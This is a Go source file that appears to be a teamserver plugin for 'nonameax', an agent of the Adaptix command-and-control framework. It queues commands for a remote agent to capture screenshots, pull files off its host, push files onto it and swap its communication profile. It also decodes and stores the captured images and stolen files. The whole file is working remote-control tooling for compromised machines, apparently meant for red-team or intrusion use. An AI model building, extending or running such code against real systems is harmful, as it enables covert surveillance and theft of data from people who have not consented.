package main

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
	"nonameax/naxwire"
)

func handleScreenshotResult(ts adaptix.Teamserver, agentId int64, data []byte) (string, string, int) {
	if len(data) < 9 {
		return "screenshot: result too short", "", len(data)
	}
	noteLen := int(binary.LittleEndian.Uint32(data[1:5]))
	if 5+noteLen+4 > len(data) {
		return "screenshot: malformed note", "", len(data)
	}
	note := string(data[5 : 5+noteLen])
	imgLen := int(binary.LittleEndian.Uint32(data[5+noteLen : 9+noteLen]))
	if 9+noteLen+imgLen > len(data) {
		return "screenshot: truncated image", "", len(data)
	}
	consumed := 9 + noteLen + imgLen
	img := data[9+noteLen : consumed]

	sanitizedNote := ""
	for _, b := range []byte(note) {
		if b >= 0x20 && b <= 0x7E {
			sanitizedNote += string(rune(b))
		}
	}

	if ts != nil {
		if err := ts.TsScreenshotAdd(agentId, sanitizedNote, img); err != nil {
			naxLogErr("TsScreenshotAdd failed: %v (agentId=%d note=%q imgLen=%d)", err, agentId, sanitizedNote, len(img))
			return fmt.Sprintf("screenshot: server error: %v", err), "", consumed
		}
	}
	naxLogOk("screenshot saved agentId=%d note=%q imgLen=%d", agentId, sanitizedNote, len(img))
	if sanitizedNote == "" {
		return "Screenshot saved", "", consumed
	}
	return fmt.Sprintf("Screenshot saved: %s", sanitizedNote), "", consumed
}

func handleDownloadResult(ts adaptix.Teamserver, agentId int64, data []byte) (string, string, int) {
	if len(data) < 9 {
		return "download: result too short", "", len(data)
	}
	nameLen := int(binary.LittleEndian.Uint32(data[1:5]))
	if 5+nameLen+4 > len(data) {
		return "download: malformed filename", "", len(data)
	}
	filename := string(data[5 : 5+nameLen])
	dlLen := int(binary.LittleEndian.Uint32(data[5+nameLen : 9+nameLen]))
	if 9+nameLen+dlLen > len(data) {
		return "download: truncated data", "", len(data)
	}
	consumed := 9 + nameLen + dlLen
	dlData := data[9+nameLen : consumed]
	var fileId int64
	if ts != nil {
		fileId = ts.TsFileGenID()
	} else {
		fileId = int64(rand.Uint32())
	}
	if ts != nil {
		addErr := ts.TsDownloadAdd(agentId, fileId, filename, int64(len(dlData)))
		updErr := ts.TsDownloadUpdate(fileId, 1, dlData)
		clsErr := ts.TsDownloadClose(fileId, 3)
		if addErr != nil || updErr != nil || clsErr != nil {
			_ = ts.TsDownloadSave(agentId, fileId, filename, dlData)
		}
	}
	return fmt.Sprintf("Downloaded: %s (%d bytes)", filename, len(dlData)), "", consumed
}

func handleChunkedDownload(ts adaptix.Teamserver, agentId int64, taskId int64, data []byte) (displayText string, completed bool, skipUpdate bool) {
	if len(data) < 5 {
		return "download: result too short", true, false
	}
	subCmd := data[0]
	fileId := int64(binary.LittleEndian.Uint32(data[1:5]))

	switch subCmd {
	case DL_START:
		if len(data) < 13 {
			return "download: START too short", true, false
		}
		fileSize := int64(binary.LittleEndian.Uint32(data[5:9]))
		fnameLen := int(binary.LittleEndian.Uint32(data[9:13]))
		if 13+fnameLen > len(data) {
			return "download: START truncated filename", true, false
		}
		filename := string(data[13 : 13+fnameLen])
		activeDownloads.Store(taskId, true)
		if ts != nil {
			_ = ts.TsDownloadAdd(agentId, fileId, filename, fileSize)
		}
		return fmt.Sprintf("Download started: %s (%d bytes) [fid %08x]", filename, fileSize, uint32(fileId)), false, false

	case DL_CONTINUE:
		chunkData := data[5:]
		if ts != nil {
			_ = ts.TsDownloadUpdate(fileId, 1, chunkData)
		}
		return "", false, true

	case DL_FINISH:
		activeDownloads.Delete(taskId)
		if ts != nil {
			_ = ts.TsDownloadClose(fileId, 3)
		}
		return fmt.Sprintf("Download complete [fid %08x]", uint32(fileId)), true, false

	default:
		return fmt.Sprintf("download: unknown sub-command 0x%02x", subCmd), true, false
	}
}


func cmdScreenshot(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	task := adaptix.TaskData{
		Type: taskTypeTask,
		Data: []byte{CMD_SCREENSHOT, 0x00, 0x00, 0x00, 0x00},
		Sync: true,
	}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "screenshot queued"}
	return task, msg, nil
}

func cmdDownload(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path, pathErr := adaptix.GetStringArg(args, "path")
	if pathErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: download: 'path' argument required")
	}
	dlChunkSize := 0
	if csRaw := adaptix.GetStringArgDefault(args, "chunk_size", ""); csRaw != "" {
		parsed, csErr := parseChunkSize(csRaw)
		if csErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: download: %w", csErr)
		}
		dlChunkSize = parsed
	}
	pathBytes := []byte(path)
	data := make([]byte, 9+len(pathBytes))
	data[0] = CMD_DOWNLOAD
	binary.LittleEndian.PutUint32(data[1:5], uint32(4+len(pathBytes)))
	binary.LittleEndian.PutUint32(data[5:9], uint32(dlChunkSize))
	copy(data[9:], pathBytes)
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	dlMsg := fmt.Sprintf("download %s queued", path)
	if dlChunkSize > 0 {
		dlMsg = fmt.Sprintf("download %s queued (chunk size: %s)", path, humanSize(dlChunkSize))
	}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: dlMsg}
	return task, msg, nil
}

func cmdUpload(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	remotePath, rpErr := adaptix.GetStringArg(args, "remote_path")
	if rpErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: upload: 'remote_path' argument required")
	}
	fileContent, err := adaptix.GetFileArg(args, "file")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: upload: %w", err)
	}

	chunkSize := getAgentChunkSize(agentData.Id)
	if csRaw := adaptix.GetStringArgDefault(args, "chunk_size", ""); csRaw != "" {
		parsed, csErr := parseChunkSize(csRaw)
		if csErr != nil {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				fmt.Errorf("nonameax: upload: %w", csErr)
		}
		chunkSize = parsed
	}

	bufferSize := len(fileContent)
	memoryId := rand.Uint32()
	fileID := Ts.TsFileGenID()

	err = Ts.TsUploadAddContent(agentData.Id, fileID, remotePath, fileContent, true, adaptix.TRANSFER_KIND_FILE, "", "")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: upload: TsUploadAddContent: %w", err)
	}

	sentBytes := 0
	taskData := adaptix.TaskData{Type: taskTypeTask, Sync: false}

	taskData.OnDispatch = func(ts any, t *adaptix.TaskData) {
		tsi := ts.(adaptix.Teamserver)

		chunk, gerr := tsi.TsUploadGetChunk(fileID, chunkSize, false)
		if gerr != nil {
			_ = tsi.TsUploadClose(fileID, adaptix.TRANSFER_STATE_CANCELED)
			t.MessageType = adaptix.MESSAGE_ERROR
			t.Message = fmt.Sprintf("Upload #%d canceled", fileID)
			t.Completed = true
			return
		}
		if chunk == nil {
			_ = tsi.TsUploadClose(fileID, adaptix.TRANSFER_STATE_FINISHED)
			t.MessageType = adaptix.MESSAGE_SUCCESS
			t.Message = fmt.Sprintf("Upload #%d finished", fileID)
			t.Completed = true
			return
		}

		argsLen := uint32(12) + uint32(len(chunk))
		data := make([]byte, 5+argsLen)
		data[0] = CMD_SAVEMEMORY
		binary.LittleEndian.PutUint32(data[1:5], argsLen)
		off := uint32(5)
		binary.LittleEndian.PutUint32(data[off:off+4], memoryId)
		off += 4
		binary.LittleEndian.PutUint32(data[off:off+4], uint32(bufferSize))
		off += 4
		binary.LittleEndian.PutUint32(data[off:off+4], uint32(len(chunk)))
		off += 4
		copy(data[off:], chunk)
		t.Data = data

		sentBytes += len(chunk)

		if sentBytes >= bufferSize {
			pathB := []byte(remotePath)
			totalArgs := 4 + 4 + len(pathB)
			uploadData := make([]byte, 1+4+totalArgs)
			uploadData[0] = CMD_UPLOAD
			binary.LittleEndian.PutUint32(uploadData[1:5], uint32(totalArgs))
			uOff := 5
			binary.LittleEndian.PutUint32(uploadData[uOff:uOff+4], memoryId)
			uOff += 4
			binary.LittleEndian.PutUint32(uploadData[uOff:uOff+4], uint32(len(pathB)))
			uOff += 4
			copy(uploadData[uOff:], pathB)

			tsi.TsTaskCreate(agentData.Id, "", "", adaptix.TaskData{
				Type:     taskTypeTask,
				AgentId:  agentData.Id,
				TaskId:   tsi.TsTaskGenID(),
				Data:     uploadData,
				Priority: priorityTask,
				Sync:     false,
			})
			_ = tsi.TsUploadClose(fileID, adaptix.TRANSFER_STATE_FINISHED)
			t.MessageType = adaptix.MESSAGE_SUCCESS
			t.Message = fmt.Sprintf("Upload #%d finished", fileID)
			t.Completed = true
		}
	}

	taskData.Repeat = true
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("Uploading %d bytes to %s", bufferSize, remotePath)}
	return taskData, msg, nil
}

func cmdProfile(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	jsonBytes, err := adaptix.GetFileArg(args, "file")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: profile: %w", err)
	}
	var profileJSON map[string]any
	if err := json.Unmarshal(jsonBytes, &profileJSON); err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: profile: invalid JSON: %w", err)
	}
	profCfg := parseProfileFromListenerConfig(profileJSON)
	wireBytes := naxwire.EncodeProfileBodyV2(profCfg)
	// cmd_id(1) | args_len(4LE) | wire_bytes
	data := make([]byte, 5+len(wireBytes))
	data[0] = CMD_PROFILE
	binary.LittleEndian.PutUint32(data[1:5], uint32(len(wireBytes)))
	copy(data[5:], wireBytes)
	if err := saveProfileToStore(agentData.Id, profCfg); err != nil {
		naxLogErr("profile: failed to save profile to store: %v", err)
	}
	pendingProfiles.Store(agentData.Id, profCfg)
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("profile update queued (%d bytes)", len(wireBytes))}
	return task, msg, nil
}


func resultProfile(agentData adaptix.AgentData, status byte) (string, string) {
	pendingProfiles.Delete(agentData.Id)
	if status == STATUS_OK {
		return "Profile updated - agent will use new profile on next heartbeat", ""
	}
	removeProfileFromStore(agentData.Id)
	return "Profile update failed on agent", ""
}
